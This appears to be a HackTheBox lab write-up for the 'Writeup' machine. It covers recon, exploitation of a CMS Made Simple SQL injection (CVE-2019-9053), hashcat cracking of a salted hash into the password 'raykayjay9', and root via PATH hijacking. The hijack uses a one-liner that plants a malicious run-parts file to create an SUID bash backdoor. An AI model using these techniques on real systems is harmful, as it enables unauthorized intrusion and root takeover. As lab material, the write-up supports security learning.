---
title: Writeup
tags:
  - HackTheBox
  - Easy
  - Linux
  - CMS
  - CVE
  - Brute-Forcing
  - Path_Hijacking
date: 2025-05-18T00:00:06Z
---
![](Pasted%20image%2020250518201722.png)

## Reconnaissance

First I performed a Nmap scan:

```shell
nmap -sC -T4 -p- 10.10.10.138 > sC.txt

[redacted]
PORT   STATE SERVICE
```

So I checked its website:

![](Pasted%20image%2020250518202738.png)

While performing directory enumeration, I get blocked after 100 petitions, so it may have some kind of WAF. So I manually enumerated the `robots.txt`:

![](Pasted%20image%2020250518203046.png)

`/writeup` endpoint is detected. So I'll check its content:

![](Pasted%20image%2020250518203123.png)

Here we can discover a new endpoint which allows us to alternate between different writeups `http://10.10.10.138/writeup/index.php?page=ypuffy`. 

We can also discover a CMS Being used named CMS Made Simple:

![](Pasted%20image%2020250518203712.png)

## Weaponizaion

I searched for "cms made simple exploit" and found CMS Made Simple < 2.2.10 - SQL Injection assigned as [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)

## Exploitation

I'll execute the script:

```shell
python2 cve.py http://10.10.10.138/writeup
```

![](Pasted%20image%2020250518205518.png)

> Hashed credentials found: `jkr:62def4866937f08cc13bab43bb14e6f7`, salt: `5a599ef579066807`

Now I'll crack the password with hashcat (first I saved it to a file like: `password:salt`):

```shell
hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

[redacted]
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

> Now I've got credentials: `jkr:raykayjay9`

### User flag

![](Pasted%20image%2020250518210202.png)

## Privilege Escalation

Running linpeas I got the following:

![](Pasted%20image%2020250518210725.png)

Then, checking the groups I form part of, I noted that I am part of `staff` group:

```shell
id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

> *Basically “staff” is a group, exist in Debian library. It allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may “override” the executables in /bin and /usr/bin with the same name).* -> [binaryregion](https://binaryregion.wordpress.com/2021/09/22/privilege-escalation-linux-staff-group/)

This machine is vulnerable to path hijacking attack. I'll need to run [PSpy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1), so I'll upload it to the machine.

![](Pasted%20image%2020250518211515.png)

>*As we SSH into the machine, root uses sh to run `/usr/bin/env` , and we see that `motd` was called and the file `10-uname` was accessed. We also see that the PATH specified before running run-parts includes two directories that we can write to, at the very start.*

Now I will create a malicious `run-parts` file in `/usr/local/bin`, which I know that will be executed when I connect via SSH. I'll use the following one-liner to create create an executable payload that will turn the bash binary into an SUID binary, effectively giving me a root shell:

```shell
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/gitblanc\nchmod u+s /bin/gitblanc' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
# Then verify
cat /usr/local/bin/run-parts
#!/bin/bash

cp /bin/bash /bin/gitblanc
chmod u+s /bin/gitblanc
```

Now I can `ssh` in, and my new backdoored shell is waiting:

![](Pasted%20image%2020250518212532.png)

### Root flag

![](Pasted%20image%2020250518212649.png)

==Machine pwned!==